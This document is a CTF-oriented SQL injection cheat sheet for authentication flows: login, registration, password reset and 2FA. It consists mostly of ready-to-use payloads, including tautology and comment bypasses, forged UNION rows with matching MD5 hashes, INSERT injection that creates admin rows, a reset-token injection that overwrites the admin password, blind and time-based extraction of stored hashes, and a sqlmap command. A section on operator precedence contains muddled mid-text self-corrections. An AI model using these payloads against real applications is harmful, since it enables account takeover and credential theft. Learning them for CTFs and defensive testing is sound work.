# Authentication SQLi — login, registration, password reset

The most common SQLi shape in CTF: `SELECT * FROM users WHERE
username='U' AND password='P'` where U or P is yours. The win is
usually "log in as the first/admin user without knowing the
password" — sometimes "log in as a specific user whose password
hash must be recovered".

Model the query shape before spraying payloads:

```sql
SELECT * FROM users WHERE username='{u}' AND password='{p}'
SELECT * FROM users WHERE username='{u}' AND password=MD5('{p}')
SELECT * FROM users WHERE (username='{u}' AND password='{p}') AND active=1
SELECT id FROM users WHERE user='{u}' OR email='{u}' AND pass='{p}'
```

Field routing matters: which field lands where decides the payload.

---

## 1. Tautology — the classics, all variants

Goal: make the WHERE true for ANY row. `' OR '1'='1` shape:

```text
admin' OR '1'='1                  -> u='admin' OR '1'='1'  (true)
admin' OR '1'='1'-- -             -> comment the password side
admin'-- -                        -> u='admin'--  password ignored!
' OR '1'='1                       -> any-user tautology
' OR '1'='1'-- -
' OR '1'='1'#
' OR '1'='1'/*
' OR ''='                         -> u='' OR ''='' (empty=empty true)
' OR 1=1-- -
' OR 1=1#
' OR true-- -
' OR 'a'='a
' OR 'a'='a'-- -
' OR 1-- -
' OR 'x'='x
' OR 'x'='x' LIMIT 1-- -
admin' OR 1=1 LIMIT 1-- -          -> pins result to first row
```

Numeric (unquoted) login fields:

```text
1 OR 1=1
1) OR (1=1
1 OR 1=1-- -
```

---

## 2. Quote-closing variants — when the simple one fails

The wrapping isn't always `'x'` — probe the shape:

```text
u = admin'                        → WHERE user='admin' AND pass='?'
u = admin')                       → WHERE (user='admin') ...
u = admin'))                      → WHERE ((user='admin')) ...
u = admin"))                      → JSON-built query: ("admin")
u = admin')-- -                   → WHERE user='admin')--  closes paren
u = admin'))-- -                  → two parens
u = admin')) OR (('1'='1          → no comment needed (balanced)
u = admin') OR ('1'='1' AND 'x'=' → balanced-close trick
u = admin' OR '1'='1')-- -
```

The balanced-close trick works when comments are filtered:

```text
u = x' OR '1'='1' AND 'x'='x
   → WHERE user='x' OR '1'='1' AND 'x'='x' AND pass='...'
     -- the tail 'x'='x' absorbs the trailing quote
```

---

## 3. Targeted-row payloads — log in as a specific user

Goal changes from "any row" to "the row you want":

```text
u = admin'-- -                     -> WHERE user='admin'--   (any pass)
u = admin' AND '1'='1'-- -         -> same but extra AND absorbs tail
u = ' OR user='admin'-- -
u = ' OR user LIKE 'adm%'-- -
u = ' UNION SELECT id,user,pass FROM users WHERE user='admin'-- -
u = x' UNION SELECT 1,'admin','x' LIMIT 1-- -    -- forged row!
```

The forged-row trick — when the app compares the returned password
to YOUR submitted password, a UNION lets you pick both:

```text
u = nobody' UNION SELECT 1,'admin','password123'-- -
p = password123
→ DB returns row (1,admin,password123); app sees pass match → in.
```

Column order matters — enumerate first (`union.md` §2), then pad:

```text
u = ' UNION SELECT NULL,NULL,'password123'-- -    -- col3 = pass?
u = ' UNION SELECT 1,2,3,4,5-- -                  -- count first
u = ' UNION SELECT 'a','b','c','d','e'-- -        -- which renders
```

If password is hashed, forge the HASH too:

```text
u = ' UNION SELECT 1,'admin',MD5('password123')-- -
u = ' UNION SELECT 1,'admin','5f4dcc3b5aa765d61d8327deb882cf99'-- -
   → app compares MD5('password123') == stored '5f4d...' → match.
```

---

## 4. Operator variants — when AND/OR precedence helps

`AND` binds tighter than `OR` — exploit it:

```text
u = x' OR '1'='1
  → WHERE user='x' OR '1'='1' AND pass='P'
    = user='x' OR (true AND pass='P')   =  pass check still applied!
    Wait: AND binds first → '1'='1' AND pass='P' → still needs P.
    The SAFE tautology needs the comment:
u = x' OR '1'='1'-- -
  → user='x' OR '1'='1'   (rest commented)  → true regardless
u = x' OR '1'='1' OR 'x'='y
  → user='x' OR true OR 'x'='y' AND pass=... — the trailing OR keeps
    it true even if the tail AND still evaluates
```

When comments are filtered and you can't kill the password clause:

```text
u = x' OR '1'='1' AND 'x'='x
  → user='x' OR ('1'='1' AND 'x'='x') AND pass='P' → needs P again.
u = x' OR '1'='1' OR 'x'='y
  → ... OR true OR ... → true regardless of pass AND-chain result.
```

The double-OR pattern is the comment-free answer: `x' OR '1'='1' OR 'x'='y` makes the whole expression true before the password AND can matter — actually no: `u='x' OR true OR 'x'='y' AND p='P'` = `u='x' OR true OR (...)` = true. Correct — the final AND clause applies to `'x'='y'` only.

Pin to a row AND kill the password:

```text
u = admin' OR 'a'='a' AND user='admin' OR 'x'='y
  → user='admin' OR (true AND user='admin') OR ('x'='y' AND pass='P')
```

---

## 5. Password-field injection

Sometimes only `p` is injectable (u validated/escaped):

```text
p = ' OR '1'='1
p = ' OR '1'='1'-- -
p = ' OR '1'='1' OR 'x'='y
p = x' AND (SELECT password FROM users WHERE user='admin')='x   -- nested check
p = ' OR EXISTS(SELECT 1 FROM users WHERE user='admin')-- -
p = ' UNION SELECT 'x'-- -
```

Hashed password compare: if the app does `pass=MD5('{p}')` then your
injection lands INSIDE MD5 — dead end. But if it does
`AND password='{p}' AND hash=MD5('{q}')` two-param form, p stays live.
Probe: does a wrong-password response differ from wrong-user? If
yes, the password value may be separately interpolated.

---

## 6. Registration-side SQLi

`INSERT INTO users(u,p,...) VALUES('{u}','{p}',...)`: covered in
`edge-contexts.md` §1. The auth-specific tricks:

```text
u = x',(SELECT 'admin'),(SELECT 'x'))-- -      -- forged INSERT row
u = admin2','pass','role')-- -                  -- extra col value
u = x'),('admin','x','admin')-- -               -- second tuple
```

Duplicate-key error oracle — register a username that exists → the
error often echoes the conflicting row:

```text
u = admin     ->  "Duplicate entry 'admin' for key 'username'"
              → proves 'admin' exists; sometimes echoes more fields
```

---

## 7. Password-reset / recovery SQLi

`SELECT ... WHERE email='{e}'` or token lookups:

```text
e = x' OR '1'='1'-- -                → reset email for ANY user
e = x' UNION SELECT 'you@x.com'-- -   → redirect the reset token to you
token = x' OR '1'='1'-- -             → token check bypass
token = ' OR LENGTH(token)>0-- -
```

`UPDATE users SET password='{new}' WHERE token='{t}'` — inject `t`:

```text
t = x' OR user='admin'-- -            → password reset for admin!
   → UPDATE ... WHERE token='x' OR user='admin'-- → sets admin's pass
```

That one is a classic CTF flag path: inject the token field to
reset the admin's password, then log in.

---

## 8. Blind auth extraction — recover a hash/secret char by char

When login result is boolean (welcome vs fail), the password field
itself is a blind oracle — extract the stored hash:

```text
u = admin' AND SUBSTRING(password,1,1)='5'-- -
u = admin' AND ASCII(SUBSTRING(password,1,1))>100-- -
u = admin' AND password LIKE 'a%'-- -
u = admin' AND password REGEXP '^abc'-- -
u = admin' AND LENGTH(password)=32-- -
u = admin' AND password LIKE BINARY 'A%'-- -     -- case-sensitive
```

Each true → you learn one constraint on the stored password/hash.
Combined with `sqli_extract.py` this is a normal binary search —
the oracle is just "logged in / not".

Same trick extracts ANY column of ANY table through the login
check:

```text
u = admin' AND (SELECT COUNT(*) FROM users)>2-- -
u = admin' AND SUBSTRING((SELECT flag FROM secrets),1,1)='f'-- -
```

Time version (no visible true/false):

```text
u = admin' AND IF(SUBSTRING(password,1,1)='5',SLEEP(3),0)-- -
u = admin' AND IF(cond,BENCHMARK(1e7,SHA1('x')),0)-- -
```

---

## 9. Multi-step auth — 2FA, MFA, second factor

`SELECT ... WHERE otp='{o}' AND user='{u}'` — same surface:

```text
o = ' OR '1'='1'-- -               → 2FA bypass
o = 000000' OR '1'='1              → numeric field w/ quote
o = ' OR user='admin'-- -           → binds to a different user
```

Device/remember-me cookies hitting `WHERE token='{c}'` — cookie
injection covered in `edge-contexts.md` §9.

---

## 10. The admin-detection checklist

```text
[ ] which field is injectable: u, p, both, or a hidden one (email,
    device id, captcha answer, remember-me)?
[ ] query shape: one-level 'u'/'p', parenthesised, multi-table?
[ ] does the app compare passwords app-side (then a UNION forged
    row works) or trust the DB WHERE (then tautology works)?
[ ] is the password hashed? then either forge hash via UNION or
    blind-extract the hash then crack offline
[ ] is there a rate limit? slow down; prefer error/UNION over blind
[ ] does error text differ per failure? error-based extraction
[ ] can you reset admin's password via token-injection instead?
```

---

## 11. The noisy variants — keep in the back pocket

```text
' OR ''='                          -- zero-length tautology
' OR 1-- -                         -- numeric bare
' OR '1                            -- unbalanced, some drivers ok
' OR '1'='1' AND '1'='1            -- extra AND tail
' OR '1'='1' OR '1'='1             -- extra OR tail
' OR '1'='1' LIMIT 0,1-- -         -- pin to one row
' OR '1'='1' ORDER BY id DESC-- -  -- pick LAST user
' OR '1'='1' GROUP BY 1-- -        -- collapse rows
' OR '1'='1' HAVING 1=1-- -        -- post-filter true
' OR (SELECT 1)=1-- -              -- subquery tautology
' OR EXISTS(SELECT 1)-- -          -- exists always true
' OR (SELECT 'a')=('a')-- -        -- expression compare
```

`sqlmap`'s auth-bypass is literally this list — but run it bounded:

```bash
sqlmap -u 'http://t/login' --data 'u=x&p=x' -p u --level=1 --risk=1 \
       --technique=BT --threads=1 --batch
```

---

## 12. When nothing works — the auth-query falsifiers

- Identical responses for `x' AND '1'='1` vs `x' AND '1'='2` on
  BOTH fields → no interpolation reaching the query. Route to
  `web-nosqli` if the field stays object-shaped, or the value is
  hashed/compared app-side.
- The app rejects your quote before the query (validation error
  differs from SQL error) → input never reaches SQL.
- `MD5('{p}')` interpolation → the value is consumed by the hash —
  no SQLi through p unless there's a second unhashed copy.
- A stored-procedure auth call may consume the parameter as a real
  param, not concatenated — the SP is injectable only from inside
  (`rce-paths.md` covers SP surface).

---

## 13. Payload ordering — first five tries

```text
1. u=admin'-- -                (comment kills the pass check)
2. u=' OR '1'='1'-- -          (tautology)
3. u=x' OR '1'='1' OR 'x'='y   (comment-free tautology)
4. u=' UNION SELECT 1,'admin','pass'-- -   + p=pass (forged row)
5. u=admin' AND SUBSTRING(password,1,1)='5'-- -   (blind start)
```

Then DBMS-aware variants from `detection.md`, and WAF transforms
from `waf-evasion.md` if a filter is in the way.
